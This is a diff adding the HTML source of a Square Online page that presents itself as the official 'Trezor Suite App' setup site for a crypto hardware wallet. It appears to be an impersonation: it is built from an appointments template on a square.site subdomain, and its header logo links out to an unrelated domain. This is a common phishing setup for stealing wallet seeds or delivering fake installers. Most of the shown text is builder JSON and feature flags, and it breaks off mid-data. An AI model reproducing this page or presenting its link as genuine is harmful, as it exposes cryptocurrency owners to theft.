@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Trezor Suite App (Official) | Set up your Trezor | Trezor Suite</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="generator" content="Square Online">
+    <link rel="shortcut icon" type="image/x-icon" href="/square.ico">
+    <link rel="preload" href="https://cdn3.editmysite.com/app/website/css/site.8597ffe32ea2dd72c2ae.css" as="style">
+
+    <style>
+        .loading-view {
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 100;
+        }
+
+        .loading-container {
+            width: 62px;
+            height: 54px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            grid-gap: 12px;
+        }
+
+        @media (min-width: 840px) {
+            .loading-container {
+                width: 72px;
+                height: 54px;
+                grid-gap: 12px;
+            }
+        }
+
+        .dot-container {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(#21212120, #212121);
+            /* Base64 encoded simple circle SVG /resources/assets/js/prime/src/site/components/ui/circle.svg */
+            mask-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9Ii0xIC0xIDIgMiI+Cgk8Y2lyY2xlIHI9IjEiLz4KPC9zdmc+Cg==');
+            -webkit-mask-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9Ii0xIC0xIDIgMiI+Cgk8Y2lyY2xlIHI9IjEiLz4KPC9zdmc+Cg==');
+            mask-repeat: no-repeat;
+            -webkit-mask-repeat: no-repeat;
+            mask-size: 100% auto;
+            -webkit-mask-size: 100% auto;
+            mask-position: bottom;
+            -webkit-mask-position: bottom;
+            animation: loading-view-movement;
+            animation-delay: 0s;
+            animation-duration: 3750ms;
+            animation-iteration-count: infinite;
+            animation-timing-function: cubic-bezier(0.8, 0, 0.8, 1);
+        }
+
+        .dot-container:nth-of-type(2) {
+            animation-delay: 130ms;
+        }
+
+        .dot-container:nth-of-type(3) {
+            animation-delay: 260ms;
+        }
+
+        @keyframes loading-view-movement {
+            /* up and down for 3s, stop for 750ms */
+            0%, 27%, 54% {
+                mask-position: bottom;
+                -webkit-mask-position: bottom;
+            }
+
+            14%, 41%, 68% {
+                mask-position: top;
+                -webkit-mask-position: top;
+            }
+
+            27%, 54%, 81%, 100% {
+                mask-position: bottom;
+                -webkit-mask-position: bottom;
+            }
+        }
+    </style>
+
+            <link rel="manifest" href="/manifest.webmanifest">
+            <meta name="apple-mobile-web-app-capable" content="yes">
+            <meta name="apple-mobile-web-app-status-bar-style" content="default">
+            <meta name='apple-mobile-web-app-title' content='Trezor Suite'>
+            <meta name='theme-color' content='#212121'>
+            <meta name='msapplication-TileColor' content='#212121'>
+            <link rel='apple-touch-icon' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/icon_180x180_ios.png?width=180'>
+            <meta name='msapplication-TileImage' content='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/icon_180x180_ios.png?width=144'>
+            <link rel='apple-touch-icon' sizes='120x120' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/icon_180x180_ios.png?width=120'>
+            <link rel='apple-touch-icon' sizes='152x152' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/icon_180x180_ios.png?width=152'>
+            <link rel='apple-touch-icon' sizes='167x167' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/icon_180x180_ios.png?width=167'>
+            <link rel='apple-touch-icon' sizes='180x180' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/icon_180x180_ios.png?width=180'>
+            <link rel='apple-touch-startup-image' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/splash_2048x4435.jpg?width=750&height=1334&fit=crop' media='(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)'>
+            <link rel='apple-touch-startup-image' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/splash_2048x4435.jpg?width=1242&height=2208&fit=crop' media='(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)'>
+            <link rel='apple-touch-startup-image' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/splash_2048x4435.jpg?width=1125&height=2436&fit=crop' media='(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)'>
+            <link rel='apple-touch-startup-image' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/splash_2048x4435.jpg?width=828&height=1792&fit=crop' media='(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)'>
+            <link rel='apple-touch-startup-image' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/splash_2048x4435.jpg?width=1242&height=2688&fit=crop' media='(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)'>
+            <link rel='apple-touch-startup-image' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/splash_2048x4435.jpg?width=1170&height=2532&fit=crop' media='(device-width: 390px) and (device-height: 844px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)'>
+            <link rel='apple-touch-startup-image' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/splash_2048x4435.jpg?width=1284&height=2778&fit=crop' media='(device-width: 428px) and (device-height: 926px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)'>
+            <link rel='apple-touch-startup-image' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/splash_2048x4435.jpg?width=1536&height=2048&fit=crop' media='(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)'>
+            <link rel='apple-touch-startup-image' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/splash_2048x4435.jpg?width=1620&height=2160&fit=crop' media='(device-width: 810px) and (device-height: 1080px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)'>
+            <link rel='apple-touch-startup-image' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/splash_2048x4435.jpg?width=1668&height=2224&fit=crop' media='(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)'>
+            <link rel='apple-touch-startup-image' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/splash_2048x4435.jpg?width=1668&height=2388&fit=crop' media='(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2)'>
+            <link rel='apple-touch-startup-image' href='/uploads/b/1c81e7b0-3db6-11ef-b13e-21fa64586a43/splash_2048x4435.jpg?width=2048&height=2732&fit=crop' media='(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2)'>
+    
+                        
+            
+    
+        <script defer src="https://cdn3.editmysite.com/app/checkout/assets/checkout/system.f98f8309eafc15a6a999.js" data-cookieconsent="ignore"></script>
+    
+    
+        <script type="systemjs-importmap" src="https://cdn3.editmysite.com/app/checkout/assets/checkout/imports.en.1a6575daee0614da.js" data-cookieconsent="ignore"></script>
+    
+    
+            <script type="systemjs-importmap" src="https://cdn3.editmysite.com/app/checkout/assets/checkout/locale-imports-map.20742d4d53bbfde2.json" data-cookieconsent="ignore"></script>
+    
+    
+    <script defer type="text/javascript" src="https://cdn3.editmysite.com/app/website/js/runtime.862782705b59ab128a54.js" data-cookieconsent="ignore"></script>
+    <script defer type="text/javascript" src="https://cdn3.editmysite.com/app/website/js/vue-modules.4a41b3ba298bf4563d97.js" data-cookieconsent="ignore"></script>
+    <script defer type="text/javascript" src="https://cdn3.editmysite.com/app/website/js/languages/en.eb760adae037f76fd328.js" data-cookieconsent="ignore"></script>
+    <script defer type="text/javascript" src="https://cdn3.editmysite.com/app/website/js/site.6344b713e3f4ad703127.js" data-cookieconsent="ignore"></script>
+
+        <meta name="description" content="Trezor Suite is  desktop app for managing your Trezor hardware wallet, providing secure storage and easy cryptocurrency management">
+    
+    <meta property="og:title" content="Home | Trezor Suite" />
+                <meta property="og:site_name" content="Trezor Suite" />
+                        <meta property="og:url" content="https://trezorsuite-hub.square.site" />
+        <meta property="og:type" content="website" />
+    
+    <script data-cookieconsent="ignore">
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+    </script>
+
+            
+    
+    <!--square-online-feature-flags-->
+<script type="application/javascript" data-cookieconsent="ignore" data-role="square-online-featureflags">
+    window.__DYNAMIC_BOOTSTRAP__ ??= {};
+
+    Object.assign(window.__DYNAMIC_BOOTSTRAP__, {
+        featureFlags: {"ecom.website.deprecated-layouts":false,"marketing-enable-drive-repeat-purchase-campaign":true,"ecom.website.facebook-food":true,"ecom.website.theme-export":false,"ecom.website.chamber-via-fastly":true,"ecom.square-online-published-catalog-cache-version":"2023-11-13","ecom.checkout.open_tabs":true,"ecom.website.photo-reviews":true,"ecom.checkout.cmi-sentry-integration":true,"ecom.checkout.cmi.bootstrap-tracking-snowplow":true,"ecom.checkout.cmi.bootstrap-tracking-ga":true,"ecom.website.order-confirmation-page.website-redirect":true,"ecom.checkout.cmi.locale-view-splitting":true,"ecom.checkout.open_tabs_gc_coupon":true,"ecom.cmi-cart":true,"ecom.checkout.cmi.theme-fonts":false,"ecom-fulfillment-api-v-2":false,"ecom.omnichannel-discounts-frontend":true,"ecom.omnichannel-discounts-category-api":false,"ecom-improved-tipping-experience":true,"ecom.splash.loyalty":true,"ecom.website.published-site.datadog-rum":true,"ecom.website.editor.datadog-rum":true,"ecom-website-published-site-datadog-rum-bot-filter":true,"ecom.image-controls.width-fix":true,"ecom.gradient-backgrounds":true,"ecom.website.form-fraud-blocking":true,"ecom.website.form-fraud-auto-ban":true,"ecom.website.code-editor":false,"ecom.shopping.pdp-layouts-m1":true,"ecom.chamber.subscriptions":true,"ecom.tuba.subscriptions-paid-shipping-rates":true,"ecom-cko-enhanced-logging":true,"ecom-cko-unified-logging":true,"ecom.shopping.so-coupons-sunset-integrations":true,"ecom.order-online-text-layouts":true,"ecom.appointment-improvements":true,"ecom.appointment-improvements-m2":true,"ecom.tuba.committed-inventory-m1":true,"ecom.splash-improvements":true,"ecom-themes-onboarding":true,"ecom.shopping.featured-categories-paid-layouts":true,"ecom.website.ai-text.short-form":true,"ecom.website.ai-text.long-form":true,"ecom.website.metered-request.override":false,"ecom.website.async-create-theme":false,"ecom.chamber.spi.serve-items":true,"ecom.can_use_cart_sharing":true,"ecom.website.ai.editor-prototype":false,"ecom.website.ai.page-seo":false,"ecom.appointment-direct-booking":true,"ecom-service-cutover-fe-request-augmentations":true,"ecom.catalog.so-item-library-deprecation-3":true,"ecom.kiosk-photo-card":true,"ecom-compare-item-availabilities":true,"ecom-use-item-availabilities":true,"ecom.website.system-page.cart":false,"ecom-enable-kiosk-large-catalog-layout":false,"ecom-hide-instagram":false,"ecom-enable-kiosk-item-preloading":true,"ecom-brand-api-sync":true,"ecom.service-cutover.enable-tuba-traffic":true,"ecom-show-order-online":true,"ecom-website-combos":false,"websdk-use-new-afterpay-buttons":true,"ecom-checkout-should-check-is-decouple-checkout":true,"ecom-prime-use-store-info-v29":true,"ecom-checkout-decouple-open-tabs":true,"ecom-checkout-force-pci-compliance":false,"ecom-website-hide-food-beverage-themes":false},
+    });
+</script>
+<!--end-square-online-feature-flags-->
+
+    <script type="application/javascript" data-cookieconsent="ignore">
+        window.__BOOTSTRAP_STATE__ = {"siteData":{"site":{"id":"1c81e7b0-3db6-11ef-b13e-21fa64586a43","properties":{"classicSiteID":"926967013859200596","catalogSiteId":"926967013859200596","selectedVertical":"other","verticalV4":"salon-barbershop","language":"en","squareMerchantId":"MLCXP12MQE56G","siteCatalogVersion":"de80f88d-8720-486d-a874-3b2bff6b641e","appSiteCartNativePayControlGroup":false,"appSiteCartNativePayTestGroup":false,"isKioskSite":false,"squareSyncUserId":"aa4a9800-17a8-4b48-a0c3-5b2526c430f5","isServiceCutoverEnabled":true,"hidden":false,"onboarded":{"guidance":{"version":"1","complete":false,"welcomeComplete":false,"instagramMiniSiteTipDismissed":false,"guidanceMobileTrafficDismissedCount":1},"isSiteDesignOnboarded":true,"isCustomizationDiscoverabilityDismissed":true},"publishedAt":1720504387,"completedFtux":{"APPOINTMENTS_SET_UP":true},"site_versions":{"editor":{"v0":"1c848900-3db6-11ef-ad4c-930c28bdb8c5","v1":"25075ae0-3db6-11ef-aff1-edcf6e3fce96","v2":"250ec7e0-3db6-11ef-bd48-0be77f04ee8d","v3":"25197430-3db6-11ef-a2bf-9f81c80d754c","v4":"25213f60-3db6-11ef-8561-a5463de6f219","v5":"2528deb0-3db6-11ef-9452-83380abfea2e","v6":"25307da0-3db6-11ef-8d97-8d9a4a36d44d","v7":"253afb50-3db6-11ef-9dc1-291c6d806829","v8":"2542f3e0-3db6-11ef-9e08-c3a40b0d24b9"}},"siteIconSettings":{"updatedAt":1720503789,"splash_images":{"config":{"size":"2048","radius":0,"fontPath":"\/var\/www\/public\/static\/fonts\/Inter\/inter-v13-latin-500.woff","iconType":"free","imageUrl":null,"language":"en","siteTitle":"Trezor Suite","customColor":"#212121","primaryColor":"#212121","contrastColor":"#ffffff"},"2048x4435":"\/uploads\/b\/1c81e7b0-3db6-11ef-b13e-21fa64586a43\/splash_2048x4435.jpg"},"ios_icon_images":{"config":{"size":"180","radius":0,"fontPath":"\/var\/www\/public\/static\/fonts\/Inter\/inter-v13-latin-500.woff","iconType":"free","imageUrl":null,"language":"en","siteTitle":"Trezor Suite","customColor":"#212121","primaryColor":"#212121","contrastColor":"#ffffff"},"180x180":"\/uploads\/b\/1c81e7b0-3db6-11ef-b13e-21fa64586a43\/icon_180x180_ios.png"},"android_icon_images":{"config":{"size":"512","radius":256,"fontPath":"\/var\/www\/public\/static\/fonts\/Inter\/inter-v13-latin-500.woff","iconType":"free","imageUrl":null,"language":"en","siteTitle":"Trezor Suite","customColor":"#212121","primaryColor":"#212121","contrastColor":"#ffffff"},"512x512":"\/uploads\/b\/1c81e7b0-3db6-11ef-b13e-21fa64586a43\/icon_512x512_android.png"}},"selectedDeviceView":"desktop","order_fulfillment_guides":"shipping","domain":{"custom_domain":"","subdomain":"trezorsuite-hub.square.site","site_id":926967013859200596}}},"pagesMeta":[{"id":"84056340-3db7-11ef-87fd-29c21c49c553","name":"Home","route":"home","title":"Home","featureType":null,"description":"","hidden":false}],"customPagesMeta":[],"artifactsMeta":[],"snapshot":{"id":"8404bb90-3db7-11ef-b28c-93ce74a579a4","site_id":"1c81e7b0-3db6-11ef-b13e-21fa64586a43","properties":{"seo":{"page":{"84056340-3db7-11ef-87fd-29c21c49c553":{"title":"Trezor Suite App (Official) | Set up your Trezor","description":"Trezor Suite is  desktop app for managing your Trezor hardware wallet, providing secure storage and easy cryptocurrency management"}}},"logo":"","color":{"primaryColor":"#212121","colorProfiles":[{"id":"custom-profile","link":"--primary-color","name":"Custom","label":"--color-secondary-minimal-black-jcNIsx","title":"--color-secondary-minimal-black-jcNIsx","paragraph":"--color-secondary-minimal-black-jcNIsx","background":"--color-white","buttonOutline":"--primary-color","buttonFilledBg":"--primary-color","buttonFilledText":"--primary-contrast-color"}],"secondaryColors":[{"id":"--color-secondary-minimal-black-jcNIsx","value":"#141414"}],"siteColorProfile":"custom-profile"},"fonts":{"fontSize":{"scale":1.117,"baseSize":14}},"icons":{},"title":"Trezor Suite","shapes":{"cardBorderRadius":"4px","imageBorderRadius":"16px","buttonBorderRadius":"8px","defaultBorderRadius":"8px"},"social":[],"fontset":{"name":"sourceserif","version":"0.1.0","overrides":{}},"spacing":{"siteWidth":2000,"siteMargin":8},"fontPair":{"id":"square-market"},"homepage":{"type":"page","typeID":"84056340-3db7-11ef-87fd-29c21c49c553"},"routeMap":{"":"84056340-3db7-11ef-87fd-29c21c49c553","home":"84056340-3db7-11ef-87fd-29c21c49c553"},"styleset":{"name":"square","version":"0.1.0"},"framework":{"name":"birdseye","version":"0.1.0"},"onboarded":false,"openGraph":{"page":{"84056340-3db7-11ef-87fd-29c21c49c553":{"title":"Home","description":""}}},"blocksMeta":{"1c8b5410-3db6-11ef-9f54-753a71236160":"yprLaZ","1c8b5411-3db6-11ef-9f54-753a71236160":"SwHbMT","1c8b5412-3db6-11ef-9f54-753a71236160":"UvNSgG","1c8b5413-3db6-11ef-9f54-753a71236160":"IeKJBp","1d2aef70-3db6-11ef-9f54-753a71236160":"VcSPge","1d39e390-3db6-11ef-9f54-753a71236160":"WyQiAF","50ca9291-3db6-11ef-8a6e-e9719d30b3e3":"iEBoFY","7eab1c20-3db6-11ef-8a6e-e9719d30b3e3":"cPWCVF"},"navigation":[],"textStyles":{"body":{"url":null,"fontId":"inter","weight":"400","fontName":"Inter","provider":"google","fontFormat":null},"label":{"url":null,"fontId":"inter","weight":"400","fontName":"Inter","provider":"google","fontFormat":null},"title":{"url":null,"fontId":"inter","weight":"500","fontName":"Inter","provider":"google","fontFormat":null},"headline":{"url":null,"fontId":"inter","weight":"400","fontName":"Inter","provider":"google","fontFormat":null}},"buttonstyle":"squared","customFonts":[],"featuresets":["retail","appointments"],"themePreset":{"id":"minimal-black","savedAt":1686833420233},"contentAreas":{"cart":{"id":"1c8b5414-3db6-11ef-9f54-753a71236160","hidden":false,"content":{"id":"1c8b5410-3db6-11ef-9f54-753a71236160","type":"block","layout":"cart-1","purpose":"cart@^1.3.6","elements":[{"id":"fa3c5c88-0af1-11ee-aec0-ed9d64720a0c","purpose":"text","properties":{}}],"properties":{"shortID":"yprLaZ"}}},"footer":{"id":"1d2aef71-3db6-11ef-9f54-753a71236160","hidden":false,"content":{"id":"1d2aef70-3db6-11ef-9f54-753a71236160","type":"block","layout":"footer-7","purpose":"footer","elements":[{"id":"1d058d21-3db6-11ef-9f54-753a71236160","purpose":"newsletter","properties":{"type":"subscription","button":{"label":"Sign Up"},"fields":[{"id":"1d058d20-3db6-11ef-9f54-753a71236160","type":"action-input","label":"","required":true,"properties":{},"instructions":""}],"hidden":true,"schema":{"id":"1d05b430-3db6-11ef-9f54-753a71236160","hash":"adc8ae8d9c3174f0c315d50d75113f27"},"confirmation":"Thanks for exploring this Square Online Theme! This contact form is for demo purposes only and you will not be contacted about your form submission."}},{"id":"fa92e0f0-0af1-11ee-aec0-ed9d64720a0c","purpose":"logo","properties":{"hidden":true}},{"id":"fa92e0f1-0af1-11ee-aec0-ed9d64720a0c","purpose":"text","properties":{"hidden":true}},{"id":"fa92e0f2-0af1-11ee-aec0-ed9d64720a0c","purpose":"social","properties":{"hidden":true}},{"id":"fa92b9e3-0af1-11ee-aec0-ed9d64720a0c","purpose":"cookie-management-settings","properties":{}}],"properties":{"shortID":"VcSPge","background":{"type":"default"},"navigation":{"hidden":true},"colorProfile":"","paymentMethods":{"hidden":true},"newsletterTitle":{"hidden":true,"content":{"quill":{"ops":[{"insert":"Stay in the Loop"},{"insert":"\n","attributes":{"block":true}}]}}}}}},"header":{"id":"1c8b5415-3db6-11ef-9f54-753a71236160","hidden":false,"content":{"id":"1c8b5411-3db6-11ef-9f54-753a71236160","type":"block","hidden":false,"layout":"header-4","purpose":"header","elements":[{"id":"fa3c5c80-0af1-11ee-aec0-ed9d64720a0c","purpose":"logo","properties":{"link":{"tab":false,"link":{"external":"https:\/\/shotheatsgnovel.com\/63fe1bc7-cbcf-40dc-b790-91250cea1372"},"type":"external"},"fontSize":"large"}},{"id":"fa3c5c81-0af1-11ee-aec0-ed9d64720a0c","purpose":"social","properties":{}},{"id":"fa3c5c82-0af1-11ee-aec0-ed9d64720a0c","purpose":"navigation","properties":{}},{"id":"fa3c5c83-0af1-11ee-aec0-ed9d64720a0c","purpose":"hamburger","properties":{}},{"id":"fa3c5c84-0af1-11ee-aec0-ed9d64720a0c","purpose":"cart","properties":{"hidden":true}}],"properties":{"shortID":"SwHbMT","textAlign":"","background":{"type":"default"},"actionButton":{"link":{"tab":false,"link":{"shopAll":true,"appointments":true,"squareAppointment":"11ee0a41ff32bdd39387ac1f6bbbd01e"},"type":"appointments"},"label":"Book Appointment\n","hidden":true,"presetStyle":"secondary"},"colorProfile":"","disableSearch":true}}},"navMobile":{"id":"1c8b5416-3db6-11ef-9f54-753a71236160","hidden":false,"content":{"id":"1c8b5412-3db6-11ef-9f54-753a71236160","type":"block","layout":"navigation-mobile","purpose":"nav-mobile@^1.2.1","elements":[{"id":"fa3c5c85-0af1-11ee-aec0-ed9d64720a0c","purpose":"navigation","properties":{}},{"id":"fa3c5c86-0af1-11ee-aec0-ed9d64720a0c","purpose":"close","properties":{}},{"id":"fa3c5c87-0af1-11ee-aec0-ed9d64720a0c","purpose":"social","properties":{}}],"properties":{"shortID":"UvNSgG"}}},"freeFooter":{"id":"1c8b5417-3db6-11ef-9f54-753a71236160","hidden":false,"content":{"id":"1c8b5413-3db6-11ef-9f54-753a71236160","type":"block","layout":"free-footer-1","purpose":"free-footer@^1.0.0","elements":[],"properties":{"shortID":"IeKJBp"}}}},"pageOverrides":{},"pageTemplates":{"product":"84068830-3db7-11ef-8afc-f12dd0439323","shopAll":"84080040-3db7-11ef-a6c9-b37ad9cdbf9a","category":"84080040-3db7-11ef-a6c9-b37ad9cdbf9a","leaveReview":"8406e520-3db7-11ef-b128-ddff946baef0","orderOnline":"8407aa30-3db7-11ef-b31d-679ec079e015","appointments":"840619d0-3db7-11ef-a753-47a3d1701db0","instagramFeed":"84074cb0-3db7-11ef-a239-0554f777a0ef","searchResults":"84080040-3db7-11ef-a6c9-b37ad9cdbf9a"},"prebuiltPages":[]},"version":8},"user":{"id":150189013,"properties":{"isSquareSyncUser":true,"country":"US"}},"billingFeatures":{"billingFeatures":{"embed_restricted_widgets":false,"com_gifting":false,"com_authorizenet_payment":false,"com_digital_products":true,"com_coupons":true,"com_product_reviews":false,"com_product_limit":-1,"popup_announcement":true,"popup_coupons":false,"popup_lead_capture":true,"community_support":true,"free_ssl_security":true,"custom_domain_connection":false,"advanced_site_stats":false,"password_protection":false,"video_backgrounds":false,"hd_video_and_audio":false,"membership_registration":false,"membership_settings":false,"online_store":true,"accept_paypal_payments":false,"product_badges":true,"product_modifiers":true,"in_store_pickup":true,"shipping_calculator":true,"chat_and_email_support":true,"phone_support":true,"priority_support":false,"advanced_ecommerce_stats":false,"seo":true,"unlimited_storage":false,"members":0,"abandoned_cart_emails":false,"integrated_shipping_labels":true,"tax_calculator":true,"no_weebly_ads":false,"site_search":false,"product_search":true,"square_gift_cards":true,"inventory_management":true,"integrated_facebook_ads":false,"real_time_shipping_calculator":false,"age_confirmation":true,"square_processing_rate_id":"ECOM_SOS_FREE","square_processing_rate_display":{"USD":[{"percent":"2.9","flat":30,"type":"all"}],"AUD":[{"percent":"2.2","flat":0,"type":"all"}],"CAD":[{"percent":"2.8","flat":30,"type":"all"}],"EUR":[{"percent":"1.4","flat":25,"type":"intra-eu"},{"percent":"2.9","flat":25,"type":"non-eu"}],"GBP":[{"percent":"1.4","flat":25,"type":"intra-eu"},{"percent":"2.5","flat":25,"type":"non-eu"}],"JPY":[{"percent":"3.6","flat":0,"type":"non-jcb"},{"percent":"3.6","flat":0,"type":"jcb"}]},"favicon_customization":true,"site_code_customization":false,"instagram_feed_tagging":true,"quick_shop":true,"scheduleEnabled":false,"smartGroupsEnabled":false,"socialAdsEnabled":true,"lifetimeEmails":2,"emailsPerMonth":2,"recipientsPerEmail":500,"recipientsPerMonth":1000,"automations":0,"automatedRecipientsPerMonth":0,"enabledLeadFormTypes":["popup"],"allowsPurchasingCredits":false,"insights_overview":false,"insights_sales":false,"insights_products":false,"custom_fonts":false,"com_shipping_settings":true,"com_manage_gift_cards":true,"com_create_shipping_label_discount":true,"customer_accounts":true,"com_stripe_payment":false,"com_product_sync":true,"com_product_variant_limit":-1,"com_shipping_labels_tier":"weebly_cpp_tier","com_transaction_fee":"0.00","form_file_upload":false,"product_scheduled_actions":false,"custom_site_icon":true,"video_uploading":0,"buyer_customer_accounts":false,"personalized_order_screen":false,"personalized_recommendations":false,"easy_reordering":false,"self_serve_ordering":false,"ecom_preorders":false,"order_text_alerts":false,"time_based_categories":false,"advanced_order_limits":false,"modifier_images":false,"free_fulfillment_meter":false,"spd_fees_amount":0,"twenty_four_seven_support":false,"advanced_design_controls":false,"order_item_quantity_limit":false,"stock_media":false,"so_buyer_subscriptions":false,"item_badge_customization":false,"shop_all_item_layouts":false,"icon_sets":false,"banner_slides":false,"priority_phone_support":false,"pdp_layouts":false,"full_height_banners":false,"scrolling_text":false,"featured_item_layouts":false,"mega_menu":false,"appts_customization":false,"premium_text_image_layout":false,"featured_category_layouts":false,"ai_generated_content":false,"image_shapes":false,"group_ordering":false,"inventory_bundles":false,"com_square_transaction_best_discount":false},"isTrial":false},"siteFeatures":{"embed_restricted_widgets":false,"com_gifting":false,"com_authorizenet_payment":false,"com_digital_products":true,"com_coupons":true,"com_product_reviews":false,"com_product_limit":-1,"popup_announcement":true,"popup_coupons":false,"popup_lead_capture":true,"community_support":true,"free_ssl_security":true,"custom_domain_connection":false,"advanced_site_stats":false,"password_protection":false,"video_backgrounds":false,"hd_video_and_audio":false,"membership_registration":false,"membership_settings":false,"online_store":true,"accept_paypal_payments":false,"product_badges":true,"product_modifiers":true,"in_store_pickup":true,"shipping_calculator":true,"chat_and_email_support":true,"phone_support":true,"priority_support":false,"advanced_ecommerce_stats":false,"seo":true,"unlimited_storage":false,"members":0,"abandoned_cart_emails":false,"integrated_shipping_labels":true,"tax_calculator":true,"no_weebly_ads":false,"site_search":false,"product_search":true,"square_gift_cards":true,"inventory_management":true,"integrated_facebook_ads":false,"real_time_shipping_calculator":false,"age_confirmation":true,"square_processing_rate_id":"ECOM_SOS_FREE","square_processing_rate_display":{"USD":[{"percent":"2.9","flat":30,"type":"all"}],"AUD":[{"percent":"2.2","flat":0,"type":"all"}],"CAD":[{"percent":"2.8","flat":30,"type":"all"}],"EUR":[{"percent":"1.4","flat":25,"type":"intra-eu"},{"percent":"2.9","flat":25,"type":"non-eu"}],"GBP":[{"percent":"1.4","flat":25,"type":"intra-eu"},{"percent":"2.5","flat":25,"type":"non-eu"}],"JPY":[{"percent":"3.6","flat":0,"type":"non-jcb"},{"percent":"3.6","flat":0,"type":"jcb"}]},"favicon_customization":true,"site_code_customization":false,"instagram_feed_tagging":true,"quick_shop":true,"scheduleEnabled":false,"smartGroupsEnabled":false,"socialAdsEnabled":true,"lifetimeEmails":2,"emailsPerMonth":2,"recipientsPerEmail":500,"recipientsPerMonth":1000,"automations":0,"automatedRecipientsPerMonth":0,"enabledLeadFormTypes":["popup"],"allowsPurchasingCredits":false,"insights_overview":false,"insights_sales":false,"insights_products":false,"custom_fonts":false,"com_shipping_settings":true,"com_manage_gift_cards":true,"com_create_shipping_label_discount":true,"customer_accounts":true,"com_stripe_payment":false,"com_product_sync":true,"com_product_variant_limit":-1,"com_shipping_labels_tier":"weebly_cpp_tier","com_transaction_fee":"0.00","form_file_upload":false,"product_scheduled_actions":false,"custom_site_icon":true,"video_uploading":0,"buyer_customer_accounts":false,"personalized_order_screen":false,"personalized_recommendations":false,"easy_reordering":false,"self_serve_ordering":false,"ecom_preorders":false,"order_text_alerts":false,"time_based_categories":false,"advanced_order_limits":false,"modifier_images":false,"free_fulfillment_meter":false,"spd_fees_amount":0,"twenty_four_seven_support":false,"advanced_design_controls":false,"order_item_quantity_limit":false,"stock_media":false,"so_buyer_subscriptions":false,"item_badge_customization":false,"shop_all_item_layouts":false,"icon_sets":false,"banner_slides":false,"priority_phone_support":false,"pdp_layouts":false,"full_height_banners":false,"scrolling_text":false,"featured_item_layouts":false,"mega_menu":false,"appts_customization":false,"premium_text_image_layout":false,"featured_category_layouts":false,"ai_generated_content":false,"image_shapes":false,"group_ordering":false,"inventory_bundles":false,"com_square_transaction_best_discount":false},"featureset":{"pages":["category","shopAll","appointments"],"quickShop":true,"search":true,"blocks":["featured-products"]},"page":{"id":"84056340-3db7-11ef-87fd-29c21c49c553","site_snapshot_id":"8404bb90-3db7-11ef-b28c-93ce74a579a4","properties":{"name":"Home","route":"home","title":"Home","hidden":false,"description":"","contentAreas":{"banner":{"id":"1d39e393-3db6-11ef-9f54-753a71236160","hidden":true,"content":{"id":"1d39e390-3db6-11ef-9f54-753a71236160","type":"block","hidden":false,"layout":"banner-3","purpose":"banner","elements":[{"id":"fac2f1a0-0af1-11ee-aec0-ed9d64720a0c","purpose":"title-1","properties":{"title":{"quill":{"ops":[{"insert":"\nGet started with this free eCommerce template for appointments"},{"insert":"\n","attributes":{"block":true}}]}},"fontSize":"step-5","textStyle":"headline"}},{"id":"fac2f1a1-0af1-11ee-aec0-ed9d64720a0c","purpose":"image-1","properties":{}},{"id":"fac2f1a2-0af1-11ee-aec0-ed9d64720a0c","purpose":"button-1","properties":{"link":{"tab":false,"link":{"shopAll":true,"appointments":true,"squareAppointment":"11ee0a41ff32bdd39387ac1f6bbbd01e"},"type":"appointments"},"label":"Book 